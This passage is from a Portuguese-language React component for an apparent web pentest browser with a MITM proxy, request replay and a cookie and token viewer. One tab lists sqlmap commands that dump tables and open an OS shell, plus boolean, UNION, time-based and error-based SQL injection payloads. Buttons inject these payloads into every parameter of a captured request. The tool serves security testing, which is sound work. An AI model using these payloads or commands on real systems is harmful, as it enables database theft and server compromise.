        <button title="Voltar" onClick={() => webviewRef.current?.goBack()} className="p-1.5 rounded hover:bg-nova-hover text-nova-text-secondary"><ArrowLeft size={14} /></button>
        <button title="Avançar" onClick={() => webviewRef.current?.goForward()} className="p-1.5 rounded hover:bg-nova-hover text-nova-text-secondary"><ArrowRight size={14} /></button>
        <button title="Recarregar" onClick={() => webviewRef.current?.reload()} className="p-1.5 rounded hover:bg-nova-hover text-nova-text-secondary"><RefreshCw size={14} /></button>

        <form
          onSubmit={(event) => {
            event.preventDefault()
            navigate()
          }}
          className="flex-1 flex items-center gap-2"
        >
          <Globe size={13} className="text-nova-text-muted" />
          <input
            value={targetUrl}
            onChange={(event) => setTargetUrl(event.target.value)}
            className="w-full h-7 bg-nova-input-bg border border-nova-input-border rounded px-2 outline-none font-mono"
            placeholder="https://sua-aplicacao.local"
          />
          <button className="h-7 px-3 rounded bg-nova-accent/15 border border-nova-accent/30 text-nova-accent hover:bg-nova-accent/25 flex items-center gap-1">
            <Play size={12} /> Abrir
          </button>
        </form>

        <button
          onClick={() => isMonitoring ? stopMonitoring() : startMonitoring()}
          className={`h-7 px-2 rounded border flex items-center gap-1 ${isMonitoring ? 'text-nova-success border-nova-success/30 bg-nova-success/10' : 'text-nova-text-secondary border-nova-border hover:bg-nova-hover'}`}
        >
          <Activity size={12} /> {isMonitoring ? 'Monitorando' : 'Monitorar'}
        </button>
        <div className="h-7 flex items-center gap-1 border border-nova-border rounded px-1 bg-nova-bg">
          <span className="text-[10px] text-nova-text-muted px-1">MITM</span>
          <input
            value={mitmPortInput}
            onChange={event => setMitmPortInput(event.target.value)}
            disabled={isMitmRunning}
            className="w-14 bg-nova-input-bg border border-nova-input-border rounded px-1 font-mono text-[10px]"
          />
          <button
            onClick={toggleMitm}
            className={`h-5 px-2 rounded flex items-center gap-1 ${isMitmRunning ? 'bg-nova-success/15 text-nova-success' : 'bg-nova-accent/15 text-nova-accent hover:bg-nova-accent/25'}`}
            title="Ativar proxy MITM local para esta sessão isolada"
          >
            {isMitmRunning ? <Square size={10} /> : <Play size={10} />}
            {isMitmRunning ? 'Ativo' : 'Ativar'}
          </button>
          <button
            onClick={openCaCert}
            className="h-5 px-1.5 rounded text-nova-text-secondary hover:text-nova-text hover:bg-nova-hover"
            title={mitmCaPath || 'Abrir certificado CA do MITM'}
          >
            <FileKey size={12} />
          </button>
        </div>
      </div>

      <div className="h-8 shrink-0 flex items-center bg-nova-bg-secondary border-b border-nova-border">
        {tabButton('browser', 'Navegador')}
        {tabButton('history', `Tráfego (${capturedRequests.length})`)}
        {tabButton('sitemap', 'URLs')}
        {tabButton('storage', 'Cookies e Sessões')}
        {tabButton('report', 'Relatório')}
        {tabButton('sqli-resources', 'SQLi Recursos')}
        {tabButton('auditor', 'Auditor')}
        {tabButton('intercept', 'Intercept')}
        {tabButton('pentest', 'PenTest')}
        {tabButton('memory', 'Memória')}
        <div className="ml-auto flex items-center gap-2 px-2">
          <label className="flex items-center gap-2 text-[10px] uppercase font-bold text-nova-text-secondary cursor-pointer">
            Auto-scan
            <input type="checkbox" checked={isAutoAnalyzeEnabled} onChange={toggleAutoAnalyze} className="accent-nova-accent" />
          </label>
          <button onClick={clearRequests} className="p-1.5 rounded hover:bg-nova-hover text-nova-text-secondary" title="Limpar evidências"><Trash2 size={13} /></button>
        </div>
      </div>

      <div className="flex-1 min-h-0 flex">
        <div className={`${activeTab === 'browser' ? 'flex' : 'hidden'} flex-1 flex-col bg-white`}>
          <webview
            ref={(node: any) => {
              webviewRef.current = node
              if (node && node !== webviewElement) setWebviewElement(node)
            }}
            src={currentUrl}
            partition={browserPartition}
            allowpopups="true"
            disablewebsecurity="true"
            className="flex-1"
          />
        </div>

        <div className={`${activeTab === 'history' ? 'flex' : 'hidden'} flex-1 min-w-0`}>
          <div className="w-[46%] border-r border-nova-border overflow-auto scrollbar-thin">
            <table className="w-full text-left border-collapse">
              <thead className="bg-nova-bg-secondary sticky top-0 z-10">
                <tr>
                  <th className="px-2 py-1.5 font-medium text-nova-text-secondary">Método</th>
                  <th className="px-2 py-1.5 font-medium text-nova-text-secondary">URL</th>
                  <th className="px-2 py-1.5 font-medium text-nova-text-secondary">Tipo</th>
                  <th className="px-2 py-1.5 font-medium text-nova-text-secondary text-right">Status</th>
                </tr>
              </thead>
              <tbody>
                {capturedRequests.map(req => (
                  <tr
                    key={req.id}
                    onClick={() => setSelectedRequest(req.id)}
                    className={`cursor-pointer border-b border-nova-border/50 hover:bg-nova-hover/50 ${selectedRequestId === req.id ? 'bg-nova-accent/10' : ''}`}
                  >
                    <td className="px-2 py-1.5 font-mono text-[10px] text-nova-accent">{req.method}</td>
                    <td className="px-2 py-1.5 truncate max-w-[320px]" title={req.url}>{req.url}</td>
                    <td className="px-2 py-1.5 text-nova-text-muted">{req.resourceType || req.protocol || '-'}</td>
                    <td className={`px-2 py-1.5 text-right font-mono ${req.error ? 'text-nova-error' : req.status && req.status >= 400 ? 'text-nova-error' : 'text-nova-success'}`}>{req.error || req.status || '...'}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>

          <div className="flex-1 min-w-0 overflow-auto scrollbar-thin bg-[#0a0f0d]">
            {selectedRequest ? (
              <div className="p-3 space-y-3">
                <div className="flex items-center justify-between gap-2">
                  <div className="font-mono text-[11px] truncate">{selectedRequest.method} {selectedRequest.url}</div>
                  <button onClick={() => handleAnalyze(selectedRequest)} className="shrink-0 flex items-center gap-1 px-2 py-1 rounded bg-nova-accent/20 text-nova-accent border border-nova-accent/30 hover:bg-nova-accent/30">
                    <Crosshair size={12} /> Analisar
                  </button>
                </div>

                <section>
                  <h3 className="font-semibold mb-1">Request Headers</h3>
                  <pre className="bg-[#131d1a] border border-nova-border rounded p-2 overflow-auto whitespace-pre-wrap text-[10px]">{formatHeaders(selectedRequest.headers) || '-'}</pre>
                </section>
                <section>
                  <h3 className="font-semibold mb-1">Request Body</h3>
                  <pre className="bg-[#131d1a] border border-nova-border rounded p-2 overflow-auto whitespace-pre-wrap text-[10px]">{selectedRequest.body || '-'}</pre>
                </section>
                <section>
                  <h3 className="font-semibold mb-1">Response Headers</h3>
                  <pre className="bg-[#131d1a] border border-nova-border rounded p-2 overflow-auto whitespace-pre-wrap text-[10px]">{formatHeaders(selectedRequest.responseHeaders) || '-'}</pre>
                </section>

                <section className="border border-nova-border rounded bg-nova-bg-secondary">
                  <div className="h-8 px-2 border-b border-nova-border flex items-center gap-2 font-semibold"><Send size={12} /> Reenviar / Manipular</div>
                  <div className="p-2 space-y-2">
                    <div className="flex gap-2">
                      <input value={replayMethod} onChange={event => setReplayMethod(event.target.value.toUpperCase())} className="w-20 bg-nova-input-bg border border-nova-input-border rounded px-2 py-1 font-mono" />
                      <input value={replayUrl} onChange={event => setReplayUrl(event.target.value)} className="flex-1 bg-nova-input-bg border border-nova-input-border rounded px-2 py-1 font-mono" />
                      <button onClick={handleReplay} className="px-3 rounded bg-nova-accent/15 border border-nova-accent/30 text-nova-accent hover:bg-nova-accent/25">Enviar</button>
                    </div>
                    <textarea value={replayHeaders} onChange={event => setReplayHeaders(event.target.value)} className="w-full min-h-[96px] bg-nova-input-bg border border-nova-input-border rounded p-2 font-mono text-[10px]" />
                    <textarea value={replayBody} onChange={event => setReplayBody(event.target.value)} className="w-full min-h-[80px] bg-nova-input-bg border border-nova-input-border rounded p-2 font-mono text-[10px]" placeholder="Body" />
                    {selectedRequest.replayResult && (
                      <pre className="bg-[#131d1a] border border-nova-border rounded p-2 overflow-auto whitespace-pre-wrap text-[10px]">HTTP {selectedRequest.replayResult.status} em {selectedRequest.replayResult.durationMs}ms{'\n'}{formatHeaders(selectedRequest.replayResult.headers)}{'\n\n'}{selectedRequest.replayResult.body.slice(0, 2000)}</pre>
                    )}
                  </div>
                </section>
              </div>
            ) : (
              <div className="h-full grid place-items-center text-nova-text-muted">Selecione uma requisição para inspecionar e manipular.</div>
            )}
          </div>
        </div>

        <div className={`${activeTab === 'sitemap' ? 'block' : 'hidden'} flex-1 overflow-auto scrollbar-thin p-4`}>
          {Object.entries(sitemapData).map(([host, paths]) => (
            <div key={host} className="mb-5">
              <div className="font-semibold flex items-center gap-2 pb-1 border-b border-nova-border"><Globe size={14} /> {host}<span className="ml-auto text-nova-text-muted">{paths.length} endpoints</span></div>
              <div className="mt-2 pl-4 border-l border-nova-border/50 space-y-1">
                {paths.map(path => <div key={path} className="font-mono text-[11px] text-nova-text-secondary">{path}</div>)}
              </div>
            </div>
          ))}
          {Object.keys(sitemapData).length === 0 && <div className="h-full grid place-items-center text-nova-text-muted">Nenhuma URL mapeada ainda.</div>}
        </div>

        <div className={`${activeTab === 'storage' ? 'flex' : 'hidden'} flex-1 min-w-0 flex-col`}>
          <div className="h-10 px-3 border-b border-nova-border bg-nova-bg-secondary flex items-center gap-2">
            <button onClick={refreshSessionData} className="flex items-center gap-1 px-2 py-1 rounded hover:bg-nova-hover border border-nova-border"><RefreshCw size={12} /> Atualizar</button>
            <button onClick={wipeBrowser} className="flex items-center gap-1 px-2 py-1 rounded hover:bg-nova-hover border border-nova-border text-nova-error"><RotateCcw size={12} /> Limpar sessão</button>
            <span className="ml-auto text-nova-text-muted">{sensitiveArtifacts.length} tokens/chaves suspeitos</span>
          </div>
          <div className="flex-1 min-h-0 grid grid-cols-4">
            <section className="border-r border-nova-border overflow-auto p-3 scrollbar-thin">
              <h3 className="font-semibold flex items-center gap-2 mb-2"><Cookie size={13} /> Cookies</h3>
              {cookies.map(cookie => (
                <div key={`${cookie.domain}:${cookie.name}`} className="border border-nova-border rounded p-2 mb-2 bg-nova-bg-secondary">
                  <div className="font-mono text-nova-accent truncate">{cookie.name}</div>
                  <div className="text-nova-text-muted truncate">{cookie.domain}{cookie.path}</div>
                  <div className="font-mono text-[10px] mt-1 break-all">{maskSecret(cookie.value)}</div>
                  <div className="mt-1 flex gap-1 flex-wrap text-[10px]">
                    {cookie.httpOnly && <span className="px-1 rounded bg-nova-success/15 text-nova-success">HttpOnly</span>}
                    {cookie.secure && <span className="px-1 rounded bg-nova-success/15 text-nova-success">Secure</span>}
                    <span className="px-1 rounded bg-nova-hover">{cookie.sameSite || 'SameSite indefinido'}</span>
                    {cookie.session && <span className="px-1 rounded bg-nova-hover">Sessão</span>}
                  </div>
                </div>
              ))}
            </section>
            <section className="border-r border-nova-border overflow-auto p-3 scrollbar-thin">
              <h3 className="font-semibold flex items-center gap-2 mb-2"><Database size={13} /> Local Storage</h3>
              <pre className="whitespace-pre-wrap text-[10px] font-mono">{JSON.stringify(storageSnapshot.localStorage, null, 2)}</pre>
            </section>
            <section className="overflow-auto p-3 scrollbar-thin">
              <h3 className="font-semibold flex items-center gap-2 mb-2"><Database size={13} /> Session Storage e Eventos</h3>
              <pre className="whitespace-pre-wrap text-[10px] font-mono mb-3">{JSON.stringify(storageSnapshot.sessionStorage, null, 2)}</pre>
              {browserEvents.slice(0, 20).map(event => (
                <div key={event.id} className="border-t border-nova-border/60 py-1 text-[10px] text-nova-text-secondary">
                  {new Date(event.timestamp).toLocaleTimeString()} {event.type}: {event.name || event.url || event.cause}
                </div>
              ))}
            </section>
            <section className="overflow-auto p-3 scrollbar-thin bg-[#0a0f0d]">
              <h3 className="font-semibold flex items-center gap-2 mb-2"><FileKey size={13} /> Tokens e Chaves</h3>
              {sensitiveArtifacts.length === 0 ? (
                <div className="text-nova-text-muted">Nenhum segredo suspeito detectado na sessão atual.</div>
              ) : (
                sensitiveArtifacts.map(item => {
                  const isRevealed = revealedSecrets[item.id]
                  return (
                    <div key={item.id} className="border border-nova-border rounded bg-nova-bg-secondary p-2 mb-2">
                      <div className="flex items-center gap-2">
                        <span className={`px-1.5 py-0.5 rounded text-[10px] uppercase font-bold ${
                          item.risk === 'alto' ? 'bg-red-500/15 text-red-300' :
                          item.risk === 'medio' ? 'bg-yellow-500/15 text-yellow-300' :
                          'bg-nova-hover text-nova-text-secondary'
                        }`}>{item.risk}</span>
                        <span className="font-semibold truncate">{item.name}</span>
                      </div>
                      <div className="text-[10px] text-nova-text-muted mt-1 truncate" title={item.location}>{item.source} - {item.location}</div>
                      <pre className="mt-2 bg-[#131d1a] border border-nova-border rounded p-2 text-[10px] whitespace-pre-wrap break-all">
                        {isRevealed ? item.value : maskSecret(item.value)}
                      </pre>
                      <div className="flex gap-2 mt-2">
                        <button
                          onClick={() => setRevealedSecrets(state => ({ ...state, [item.id]: !state[item.id] }))}
                          className="px-2 py-1 rounded border border-nova-border hover:bg-nova-hover text-[10px]"
                        >
                          {isRevealed ? 'Mascarar' : 'Revelar'}
                        </button>
                        <button
                          onClick={() => navigator.clipboard.writeText(item.value)}
                          className="px-2 py-1 rounded border border-nova-border hover:bg-nova-hover text-[10px]"
                        >
                          Copiar evidência
                        </button>
                      </div>
                      <ul className="mt-2 space-y-1 text-[10px] text-nova-text-secondary">
                        {item.reasons.map(reason => <li key={reason}>- {reason}</li>)}
                      </ul>
                      {item.jwt && (
                        <div className="mt-2">
                          <div className="text-[10px] font-semibold text-nova-accent mb-1">JWT decodificado{item.jwt.expiresAt ? ` - expira em ${item.jwt.expiresAt}` : ''}</div>
                          <pre className="bg-[#131d1a] border border-nova-border rounded p-2 text-[10px] whitespace-pre-wrap overflow-auto max-h-48">
                            {JSON.stringify({ header: item.jwt.header, payload: item.jwt.payload }, null, 2)}
                          </pre>
                        </div>
                      )}
                    </div>
                  )
                })
              )}
            </section>
          </div>
        </div>

        <div className={`${activeTab === 'report' ? 'flex' : 'hidden'} flex-1 min-w-0 flex-col`}>
          <div className="h-10 px-3 border-b border-nova-border bg-nova-bg-secondary flex items-center gap-2">
            <Bug size={13} className="text-nova-accent" />
            <span className="font-semibold">Relatório de apontamentos</span>
            <button onClick={openHtmlReportInBrowser} className="ml-auto flex items-center gap-1 px-2 py-1 rounded bg-nova-hover border border-nova-border text-nova-text-secondary hover:text-nova-text hover:bg-nova-hover/70">
              <Globe size={12} /> Abrir no navegador
            </button>
            <button onClick={copyReport} className="flex items-center gap-1 px-2 py-1 rounded bg-nova-accent/15 border border-nova-accent/30 text-nova-accent hover:bg-nova-accent/25">
              <Clipboard size={12} /> {reportCopied ? 'Copiado' : 'Copiar Markdown'}
            </button>
          </div>
          <textarea readOnly value={report} className="flex-1 bg-[#0a0f0d] text-nova-text p-4 font-mono text-[11px] outline-none resize-none" />
        </div>

        <div className={`${activeTab === 'sqli-resources' ? 'flex' : 'hidden'} flex-1 min-w-0 flex-col overflow-auto`}>
          <div className="h-10 px-3 border-b border-nova-border bg-nova-bg-secondary flex items-center gap-2 shrink-0">
            <Database size={13} className="text-nova-accent" />
            <span className="font-semibold">Recursos de SQL Injection</span>
          </div>
          
          <div className="flex-1 overflow-auto scrollbar-thin p-4 space-y-4">
            <section className="border border-nova-border rounded-lg bg-nova-bg-secondary">
              <div className="px-4 py-2 border-b border-nova-border bg-nova-bg-secondary/50">
                <h3 className="font-semibold flex items-center gap-2 text-nova-accent">
                  <Database size={14} />
                  Ferramentas para Testar SQL Injection
                </h3>
              </div>
              <div className="p-4 space-y-3">
                <div className="bg-[#131d1a] border border-nova-border rounded-lg p-3">
                  <div className="flex items-center justify-between mb-2">
                    <h4 className="font-semibold text-nova-text">🔧 sqlmap (Automated)</h4>
                    <button
                      onClick={() => {
                        if (currentUrl && currentUrl !== 'about:blank' && currentUrl.startsWith('http')) {
                          navigator.clipboard.writeText(`sqlmap -u "${currentUrl}" --batch --dbs`)
                        }
                      }}
                      disabled={!currentUrl || currentUrl === 'about:blank'}
                      className="px-3 py-1 bg-nova-accent/10 text-nova-accent rounded text-[10px] hover:bg-nova-accent/20 disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-1"
                    >
                      <Play size={12} />
                      Testar no site atual
                    </button>
                  </div>
                  <pre className="bg-[#0a0f0d] p-2 rounded text-[11px] font-mono text-nova-text overflow-auto">
{`# Instalação (Python)
pip install sqlmap

# Uso básico
sqlmap -u "${currentUrl && currentUrl !== 'about:blank' ? currentUrl : 'http://exemplo.com/page?id=1'}" --dbs

# Extrair tabelas
sqlmap -u "${currentUrl && currentUrl !== 'about:blank' ? currentUrl : 'http://exemplo.com/page?id=1'}" -D banco --tables

# Extrair dados
sqlmap -u "${currentUrl && currentUrl !== 'about:blank' ? currentUrl : 'http://exemplo.com/page?id=1'}" -D banco -T usuarios --dump

# Shell SQL
sqlmap -u "${currentUrl && currentUrl !== 'about:blank' ? currentUrl : 'http://exemplo.com/page?id=1'}" --sql-shell

# OS Shell (se vulnerável)
sqlmap -u "${currentUrl && currentUrl !== 'about:blank' ? currentUrl : 'http://exemplo.com/page?id=1'}" --os-shell`}
                  </pre>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                  <div className="bg-[#131d1a] border border-nova-border rounded-lg p-3">
                    <h4 className="font-semibold text-nova-text mb-2">🌐 Ferramentas Web</h4>
                    <ul className="text-[11px] text-nova-text-secondary space-y-1">
                      <li>• PortSwigger Web Security Academy</li>
                      <li>• OWASP ZAP (Zed Attack Proxy)</li>
                      <li>• Burp Suite</li>
                      <li>• OWASP SQLi Scanner</li>
                    </ul>
                  </div>

                  <div className="bg-[#131d1a] border border-nova-border rounded-lg p-3">
                    <h4 className="font-semibold text-nova-text mb-2">📦 Ferramentas CLI</h4>
                    <ul className="text-[11px] text-nova-text-secondary space-y-1">
                      <li>• sqlmap</li>
                      <li>• NoSQLMap</li>
                      <li>• sqlninja</li>
                      <li>• bbqsql</li>
                    </ul>
                  </div>
                </div>
              </div>
            </section>

            <section className="border border-nova-border rounded-lg bg-nova-bg-secondary">
              <div className="px-4 py-2 border-b border-nova-border bg-nova-bg-secondary/50">
                <h3 className="font-semibold flex items-center gap-2 text-nova-accent">
                  <Database size={14} />
                  Payloads Prontos para Testar
                </h3>
              </div>
              <div className="p-4 space-y-3">
                <div className="bg-[#131d1a] border border-nova-border rounded-lg p-3">
                  <h4 className="font-semibold text-nova-text mb-2">Boolean-Based (True/False)</h4>
                  <div className="space-y-2">
                    <div className="flex items-center justify-between gap-2">
                      <code className="text-[11px] bg-[#0a0f0d] px-2 py-1 rounded flex-1">' OR '1'='1</code>
                      <button onClick={() => navigator.clipboard.writeText("' OR '1'='1")} className="px-2 py-1 bg-nova-accent/10 text-nova-accent rounded text-[10px] hover:bg-nova-accent/20 shrink-0">Copiar</button>
                      {selectedRequest && (
                        <button onClick={() => {
                          // Vamos injetar o payload na requisição selecionada
                          let newUrl = selectedRequest.url
                          let newBody = selectedRequest.body || ''
                          
                          // Tentar injetar no query string primeiro
                          if (newUrl.includes('?')) {
                            newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3' OR '1'='1`)
                          }
                          
                          // Tentar injetar no body se for form-data ou x-www-form-urlencoded
                          if (newBody.includes('=')) {
                            newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2' OR '1'='1`)
                          }
                          
                          setReplayUrl(newUrl)
                          setReplayBody(newBody)
                          setReplayMethod(selectedRequest.method)
                          setReplayHeaders(formatHeaders(selectedRequest.headers))
                          setActiveTab('history')
                        }} className="px-2 py-1 bg-blue-500/10 text-blue-400 rounded text-[10px] hover:bg-blue-500/20 shrink-0">Testar</button>
                      )}
                    </div>
                    <div className="flex items-center justify-between gap-2">
                      <code className="text-[11px] bg-[#0a0f0d] px-2 py-1 rounded flex-1">' OR 1=1--</code>
                      <button onClick={() => navigator.clipboard.writeText("' OR 1=1--")} className="px-2 py-1 bg-nova-accent/10 text-nova-accent rounded text-[10px] hover:bg-nova-accent/20 shrink-0">Copiar</button>
                      {selectedRequest && (
                        <button onClick={() => {
                          let newUrl = selectedRequest.url
                          let newBody = selectedRequest.body || ''
                          
                          if (newUrl.includes('?')) {
                            newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3' OR 1=1--`)
                          }
                          if (newBody.includes('=')) {
                            newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2' OR 1=1--`)
                          }
                          
                          setReplayUrl(newUrl)
                          setReplayBody(newBody)
                          setReplayMethod(selectedRequest.method)
                          setReplayHeaders(formatHeaders(selectedRequest.headers))
                          setActiveTab('history')
                        }} className="px-2 py-1 bg-blue-500/10 text-blue-400 rounded text-[10px] hover:bg-blue-500/20 shrink-0">Testar</button>
                      )}
                    </div>
                    <div className="flex items-center justify-between gap-2">
                      <code className="text-[11px] bg-[#0a0f0d] px-2 py-1 rounded flex-1">' AND '1'='2</code>
                      <button onClick={() => navigator.clipboard.writeText("' AND '1'='2")} className="px-2 py-1 bg-nova-accent/10 text-nova-accent rounded text-[10px] hover:bg-nova-accent/20 shrink-0">Copiar</button>
                      {selectedRequest && (
                        <button onClick={() => {
                          let newUrl = selectedRequest.url
                          let newBody = selectedRequest.body || ''
                          
                          if (newUrl.includes('?')) {
                            newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3' AND '1'='2`)
                          }
                          if (newBody.includes('=')) {
                            newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2' AND '1'='2`)
                          }
                          
                          setReplayUrl(newUrl)
                          setReplayBody(newBody)
                          setReplayMethod(selectedRequest.method)
                          setReplayHeaders(formatHeaders(selectedRequest.headers))
                          setActiveTab('history')
                        }} className="px-2 py-1 bg-blue-500/10 text-blue-400 rounded text-[10px] hover:bg-blue-500/20 shrink-0">Testar</button>
                      )}
                    </div>
                  </div>
                </div>

                <div className="bg-[#131d1a] border border-nova-border rounded-lg p-3">
                  <h4 className="font-semibold text-nova-text mb-2">UNION-Based (Extrair Dados)</h4>
                  <div className="space-y-2">
                    <div className="flex items-center justify-between gap-2">
                      <code className="text-[11px] bg-[#0a0f0d] px-2 py-1 rounded flex-1">' UNION SELECT NULL,NULL--</code>
                      <button onClick={() => navigator.clipboard.writeText("' UNION SELECT NULL,NULL--")} className="px-2 py-1 bg-nova-accent/10 text-nova-accent rounded text-[10px] hover:bg-nova-accent/20 shrink-0">Copiar</button>
                      {selectedRequest && (
                        <button onClick={() => {
                          let newUrl = selectedRequest.url
                          let newBody = selectedRequest.body || ''
                          
                          if (newUrl.includes('?')) {
                            newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3' UNION SELECT NULL,NULL--`)
                          }
                          if (newBody.includes('=')) {
                            newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2' UNION SELECT NULL,NULL--`)
                          }
                          
                          setReplayUrl(newUrl)
                          setReplayBody(newBody)
                          setReplayMethod(selectedRequest.method)
                          setReplayHeaders(formatHeaders(selectedRequest.headers))
                          setActiveTab('history')
                        }} className="px-2 py-1 bg-blue-500/10 text-blue-400 rounded text-[10px] hover:bg-blue-500/20 shrink-0">Testar</button>
                      )}
                    </div>
                    <div className="flex items-center justify-between gap-2">
                      <code className="text-[11px] bg-[#0a0f0d] px-2 py-1 rounded flex-1">' UNION SELECT version(),database()--</code>
                      <button onClick={() => navigator.clipboard.writeText("' UNION SELECT version(),database()--")} className="px-2 py-1 bg-nova-accent/10 text-nova-accent rounded text-[10px] hover:bg-nova-accent/20 shrink-0">Copiar</button>
                      {selectedRequest && (
                        <button onClick={() => {
                          let newUrl = selectedRequest.url
                          let newBody = selectedRequest.body || ''
                          
                          if (newUrl.includes('?')) {
                            newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3' UNION SELECT version(),database()--`)
                          }
                          if (newBody.includes('=')) {
                            newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2' UNION SELECT version(),database()--`)
                          }
                          
                          setReplayUrl(newUrl)
                          setReplayBody(newBody)
                          setReplayMethod(selectedRequest.method)
                          setReplayHeaders(formatHeaders(selectedRequest.headers))
                          setActiveTab('history')
                        }} className="px-2 py-1 bg-blue-500/10 text-blue-400 rounded text-[10px] hover:bg-blue-500/20 shrink-0">Testar</button>
                      )}
                    </div>
                    <div className="flex items-center justify-between gap-2">
                      <code className="text-[11px] bg-[#0a0f0d] px-2 py-1 rounded flex-1">' UNION SELECT user(),password FROM usuarios--</code>
                      <button onClick={() => navigator.clipboard.writeText("' UNION SELECT user(),password FROM usuarios--")} className="px-2 py-1 bg-nova-accent/10 text-nova-accent rounded text-[10px] hover:bg-nova-accent/20 shrink-0">Copiar</button>
                      {selectedRequest && (
                        <button onClick={() => {
                          let newUrl = selectedRequest.url
                          let newBody = selectedRequest.body || ''
                          
                          if (newUrl.includes('?')) {
                            newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3' UNION SELECT user(),password FROM usuarios--`)
                          }
                          if (newBody.includes('=')) {
                            newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2' UNION SELECT user(),password FROM usuarios--`)
                          }
                          
                          setReplayUrl(newUrl)
                          setReplayBody(newBody)
                          setReplayMethod(selectedRequest.method)
                          setReplayHeaders(formatHeaders(selectedRequest.headers))
                          setActiveTab('history')
                        }} className="px-2 py-1 bg-blue-500/10 text-blue-400 rounded text-[10px] hover:bg-blue-500/20 shrink-0">Testar</button>
                      )}
                    </div>
                  </div>
                </div>

                <div className="bg-[#131d1a] border border-nova-border rounded-lg p-3">
                  <h4 className="font-semibold text-nova-text mb-2">Time-Based (Blind)</h4>
                  <div className="space-y-2">
                    <div className="flex items-center justify-between gap-2">
                      <code className="text-[11px] bg-[#0a0f0d] px-2 py-1 rounded flex-1">'; WAITFOR DELAY '0:0:10'--</code>
                      <button onClick={() => navigator.clipboard.writeText("'; WAITFOR DELAY '0:0:10'--")} className="px-2 py-1 bg-nova-accent/10 text-nova-accent rounded text-[10px] hover:bg-nova-accent/20 shrink-0">Copiar (SQL Server)</button>
                      {selectedRequest && (
                        <button onClick={() => {
                          let newUrl = selectedRequest.url
                          let newBody = selectedRequest.body || ''
                          
                          if (newUrl.includes('?')) {
                            newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3'; WAITFOR DELAY '0:0:10'--`)
                          }
                          if (newBody.includes('=')) {
                            newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2'; WAITFOR DELAY '0:0:10'--`)
                          }
                          
                          setReplayUrl(newUrl)
                          setReplayBody(newBody)
                          setReplayMethod(selectedRequest.method)
                          setReplayHeaders(formatHeaders(selectedRequest.headers))
                          setActiveTab('history')
                        }} className="px-2 py-1 bg-blue-500/10 text-blue-400 rounded text-[10px] hover:bg-blue-500/20 shrink-0">Testar</button>
                      )}
                    </div>
                    <div className="flex items-center justify-between gap-2">
                      <code className="text-[11px] bg-[#0a0f0d] px-2 py-1 rounded flex-1">'; SELECT SLEEP(10)--</code>
                      <button onClick={() => navigator.clipboard.writeText("'; SELECT SLEEP(10)--")} className="px-2 py-1 bg-nova-accent/10 text-nova-accent rounded text-[10px] hover:bg-nova-accent/20 shrink-0">Copiar (MySQL)</button>
                      {selectedRequest && (
                        <button onClick={() => {
                          let newUrl = selectedRequest.url
                          let newBody = selectedRequest.body || ''
                          
                          if (newUrl.includes('?')) {
                            newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3'; SELECT SLEEP(10)--`)
                          }
                          if (newBody.includes('=')) {
                            newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2'; SELECT SLEEP(10)--`)
                          }
                          
                          setReplayUrl(newUrl)
                          setReplayBody(newBody)
                          setReplayMethod(selectedRequest.method)
                          setReplayHeaders(formatHeaders(selectedRequest.headers))
                          setActiveTab('history')
                        }} className="px-2 py-1 bg-blue-500/10 text-blue-400 rounded text-[10px] hover:bg-blue-500/20 shrink-0">Testar</button>
                      )}
                    </div>
                    <div className="flex items-center justify-between gap-2">
                      <code className="text-[11px] bg-[#0a0f0d] px-2 py-1 rounded flex-1">'; SELECT PG_SLEEP(10)--</code>
                      <button onClick={() => navigator.clipboard.writeText("'; SELECT PG_SLEEP(10)--")} className="px-2 py-1 bg-nova-accent/10 text-nova-accent rounded text-[10px] hover:bg-nova-accent/20 shrink-0">Copiar (PostgreSQL)</button>
                      {selectedRequest && (
                        <button onClick={() => {
                          let newUrl = selectedRequest.url
                          let newBody = selectedRequest.body || ''
                          
                          if (newUrl.includes('?')) {
                            newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3'; SELECT PG_SLEEP(10)--`)
                          }
                          if (newBody.includes('=')) {
                            newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2'; SELECT PG_SLEEP(10)--`)
                          }
                          
                          setReplayUrl(newUrl)
                          setReplayBody(newBody)
                          setReplayMethod(selectedRequest.method)
                          setReplayHeaders(formatHeaders(selectedRequest.headers))
                          setActiveTab('history')
                        }} className="px-2 py-1 bg-blue-500/10 text-blue-400 rounded text-[10px] hover:bg-blue-500/20 shrink-0">Testar</button>
                      )}
                    </div>
                  </div>
                </div>

                <div className="bg-[#131d1a] border border-nova-border rounded-lg p-3">
                  <h4 className="font-semibold text-nova-text mb-2">Error-Based (Extrair via Erros)</h4>
                  <div className="space-y-2">
                    <div className="flex items-center justify-between gap-2">
                      <code className="text-[11px] bg-[#0a0f0d] px-2 py-1 rounded flex-1">' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--</code>
                      <button onClick={() => navigator.clipboard.writeText("' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--")} className="px-2 py-1 bg-nova-accent/10 text-nova-accent rounded text-[10px] hover:bg-nova-accent/20 shrink-0">Copiar (MySQL)</button>
